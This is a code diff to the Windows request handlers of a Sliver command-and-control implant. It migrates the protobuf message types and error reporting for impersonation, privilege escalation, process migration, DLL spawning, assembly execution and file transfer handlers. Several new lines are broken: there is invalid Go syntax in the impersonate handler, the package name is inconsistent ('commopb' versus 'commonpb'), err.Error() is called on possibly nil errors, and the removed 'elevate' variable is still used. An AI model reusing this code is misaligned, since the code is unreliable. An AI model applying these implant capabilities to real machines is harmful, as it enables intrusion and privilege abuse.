@@ -23,7 +23,7 @@ import (
 	"log"
 	// {{else}}{{end}}
 
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/priv"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
 
@@ -34,37 +34,36 @@ import (
 var (
 	windowsHandlers = map[uint32]RPCHandler{
 		// Windows Only
-		pb.MsgTask:               taskHandler,
-		pb.MsgRemoteTask:         remoteTaskHandler,
-		pb.MsgProcessDumpReq:     dumpHandler,
-		pb.MsgImpersonateReq:     impersonateHandler,
-		pb.MsgRevToSelf:          revToSelfHandler,
-		pb.MsgRunAs:              runAsHandler,
-		pb.MsgGetSystemReq:       getsystemHandler,
-		pb.MsgElevateReq:         elevateHandler,
-		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
-		pb.MsgMigrateReq:         migrateHandler,
-		pb.MsgSpawnDllReq:        spawnDllHandler,
+		sliverpb.MsgTaskReq:            taskHandler,
+		sliverpb.MsgRemoteTaskReq:      remoteTaskHandler,
+		sliverpb.MsgProcessDumpReq:     dumpHandler,
+		sliverpb.MsgImpersonateReq:     impersonateHandler,
+		sliverpb.MsgRevToSelf:          revToSelfHandler,
+		sliverpb.MsgRunAs:              runAsHandler,
+		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
+		sliverpb.MsgElevateReq:         elevateHandler,
+		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
+		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
+		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
 
 		// Generic
-		pb.MsgPsReq:       psHandler,
-		pb.MsgTerminate:   terminateHandler,
-		pb.MsgPing:        pingHandler,
-		pb.MsgLsReq:       dirListHandler,
-		pb.MsgDownloadReq: downloadHandler,
-		pb.MsgUploadReq:   uploadHandler,
-		pb.MsgCdReq:       cdHandler,
-		pb.MsgPwdReq:      pwdHandler,
-		pb.MsgRmReq:       rmHandler,
-		pb.MsgMkdirReq:    mkdirHandler,
-		pb.MsgIfconfigReq: ifconfigHandler,
-		pb.MsgExecuteReq:  executeHandler,
+		sliverpb.MsgPsReq:       psHandler,
+		sliverpb.MsgTerminate:   terminateHandler,
+		sliverpb.MsgPing:        pingHandler,
+		sliverpb.MsgLsReq:       dirListHandler,
+		sliverpb.MsgDownloadReq: downloadHandler,
+		sliverpb.MsgUploadReq:   uploadHandler,
+		sliverpb.MsgCdReq:       cdHandler,
+		sliverpb.MsgPwdReq:      pwdHandler,
+		sliverpb.MsgRmReq:       rmHandler,
+		sliverpb.MsgMkdirReq:    mkdirHandler,
+		sliverpb.MsgIfconfigReq: ifconfigHandler,
+		sliverpb.MsgExecuteReq:  executeHandler,
 
-		pb.MsgScreenshotReq: screenshotHandler,
+		sliverpb.MsgScreenshotReq: screenshotHandler,
 
-		pb.MsgSideloadReq: sideloadHandler,
-		pb.MsgNetstatReq:  netstatHandler,
-
+		sliverpb.MsgSideloadReq: sideloadHandler,
+		sliverpb.MsgNetstatReq:  netstatHandler,
 	}
 )
 
@@ -76,7 +75,7 @@ func GetSystemHandlers() map[uint32]RPCHandler {
 
 func impersonateHandler(data []byte, resp RPCResponse) {
 	var errStr string
-	impersonateReq := &pb.ImpersonateReq{}
+	impersonateReq := &sliverpb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -85,13 +84,12 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	token, err := priv.Impersonate(impersonateReq.Username)
-	if err != nil {
-		errStr = err.Error()
-	} else {
+	if err == nil {
 		taskrunner.CurrentToken = token
 	}
-	impersonate := &pb.Impersonate{
-		Err: errStr,
+	impersonate := &sliverpb.Impersonate{}
+	if err != nil {
+		impersonate.Response: &commopb.Response{Err: err.Error()},
 	}
 	data, err = proto.Marshal(impersonate)
 	resp(data, err)
@@ -99,7 +97,7 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 
 func runAsHandler(data []byte, resp RPCResponse) {
 	var errStr string
-	runAsReq := &pb.RunAsReq{}
+	runAsReq := &sliverpb.RunAsReq{}
 	err := proto.Unmarshal(data, runAsReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -108,12 +106,9 @@ func runAsHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.Process, runAsReq.Args)
-	if err != nil {
-		errStr = err.Error()
-	}
-	runAs := &pb.RunAs{
-		Output: out,
-		Err:    errStr,
+	runAs := &sliverpb.RunAs{
+		Output:   out,
+		Response: &commopb.Response{Err: err.Error()},
 	}
 	data, err = proto.Marshal(runAs)
 	resp(data, err)
@@ -126,11 +121,8 @@ func revToSelfHandler(_ []byte, resp RPCResponse) {
 	//{{end}}
 	taskrunner.CurrentToken = windows.Token(0)
 	err := priv.RevertToSelf()
-	if err != nil {
-		errStr = err.Error()
-	}
-	revToSelfResp := &pb.RevToSelf{
-		Err: errStr,
+	revToSelfResp := &sliverpb.RevToSelf{
+		&commopb.Response{Err: err.Error()}
 	}
 	//{{if .Debug}}
 	log.Println("revToSelf done!")
@@ -140,7 +132,7 @@ func revToSelfHandler(_ []byte, resp RPCResponse) {
 }
 
 func getsystemHandler(data []byte, resp RPCResponse) {
-	gsReq := &pb.GetSystemReq{}
+	gsReq := &sliverpb.InvokeGetSystemReq{}
 	err := proto.Unmarshal(data, gsReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -149,7 +141,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	err = priv.GetSystem(gsReq.Data, gsReq.HostingProcess)
-	gsResp := &pb.GetSystem{}
+	gsResp := &sliverpb.GetSystem{}
 	if err != nil {
 		gsResp.Output = err.Error()
 	}
@@ -158,7 +150,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 }
 
 func elevateHandler(data []byte, resp RPCResponse) {
-	elevateReq := &pb.ElevateReq{}
+	elevateReq := &sliverpb.ElevateReq{}
 	err := proto.Unmarshal(data, elevateReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -166,14 +158,9 @@ func elevateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	elevate := &pb.Elevate{}
 	err = priv.Elevate()
 	if err != nil {
-		elevate.Err = err.Error()
-		elevate.Success = false
-	} else {
-		elevate.Success = true
-		elevate.Err = ""
+		elevate.Response = &commonpb.Response{Err: err.Error()}
 	}
 	data, err = proto.Marshal(elevate)
 	resp(data, err)
@@ -183,7 +170,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 	//{{if .Debug}}
 	log.Println("executeAssemblyHandler called")
 	//{{end}}
-	execReq := &pb.ExecuteAssemblyReq{}
+	execReq := &sliverpb.ExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -196,9 +183,11 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 	if err != nil {
 		strErr = err.Error()
 	}
-	execResp := &pb.ExecuteAssembly{
+	execResp := &sliverpb.ExecuteAssembly{
 		Output: output,
-		Error:  strErr,
+		Response: &commonpb.Response{
+			Err: fmt.Sprintf("%s", err),
+		},
 	}
 	data, err = proto.Marshal(execResp)
 	resp(data, err)
@@ -209,7 +198,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	// {{if .Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
-	migrateReq := &pb.MigrateReq{}
+	migrateReq := &sliverpb.InvokeMigrateReq{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
 		// {{if .Debug}}
@@ -221,13 +210,14 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	// {{if .Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
-	migrateResp := &pb.Migrate{
+	migrateResp := &sliverpb.Migrate{
 		Success: true,
-		Err:     "",
 	}
 	if err != nil {
 		migrateResp.Success = false
-		migrateResp.Err = err.Error()
+		migrateResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%s", err),
+		}
 		// {{if .Debug}}
 		log.Println("migrateHandler: RemoteTask failed:", err)
 		// {{end}}
@@ -237,7 +227,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 }
 
 func spawnDllHandler(data []byte, resp RPCResponse) {
-	spawnReq := &pb.SpawnDllReq{}
+	spawnReq := &sliverpb.SpawnDllReq{}
 	err := proto.Unmarshal(data, spawnReq)
 
 	if err != nil {
@@ -250,14 +240,15 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.ProcName, spawnReq.Offset, spawnReq.Args)
 	//{{end}}
 	result, err := taskrunner.SpawnDll(spawnReq.ProcName, spawnReq.Data, spawnReq.Offset, spawnReq.Args)
-	errStr := ""
-	if err != nil {
-		errStr = err.Error()
-	}
-	spawnResp := &pb.SpawnDll{
+	spawnResp := &sliverpb.SpawnDll{
 		Result: result,
-		Error:  errStr,
 	}
+	if err != nil {
+		spawnResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%s", err),
+		}
+	}
+
 	data, err = proto.Marshal(spawnResp)
 	resp(data, err)
 }
